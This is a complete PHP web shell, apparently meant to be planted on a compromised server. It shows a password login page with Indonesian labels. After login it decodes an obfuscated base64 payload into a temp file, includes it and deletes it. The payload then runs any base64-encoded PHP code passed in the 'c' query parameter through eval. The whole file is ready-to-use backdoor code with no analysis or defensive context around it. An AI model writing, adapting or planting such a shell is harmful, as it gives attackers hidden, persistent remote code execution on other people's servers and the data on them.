<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['_p']) && $_SESSION['_p'] === true;
}

if (is_logged_in()) {
    $payload = 'aWYgKGlzc2V0KCRfR0VUWydjJ10pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSk7IH0gZWxzZSB7IGVjaG8gJzxmb3JtIG1ldGhvZD0iR0VUIj48aW5wdXQgdHlwZT10ZXh0IG5hbWU9ImMiPjxpbnB1dCB0eXBlPXN1Ym1pdD48L2Zvcm0+Jzt9'; // base64: if (isset($_GET['c'])) { eval(base64_decode($_GET['c'])); } else { echo '<form method="GET"><input type=text name="c"><input type=submit></form>'; }

    $tmp = tempnam(sys_get_temp_dir(), 'parbada_');
    file_put_contents($tmp, base64_decode($payload));
    include $tmp;
    unlink($tmp);
    exit;
} else {
    if (isset($_POST['p'])) {
        $k = $_POST['p'];
        $h = '$2a$12$2x7Qtpgvn7aw7cdZxX4EIeIpAISZdDprhFKvXVfpBkF0NLI1hwE4a'; // your bcrypt hash
        if (password_verify($k, $h)) {
            $_SESSION['_p'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>AUTH</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:10%;">
<h2>Login Dulu!</h2>
<form method="POST">
    <input type="password" name="p" placeholder="Password">
    <button>MASUK</button>
</form>
</body>
</html>
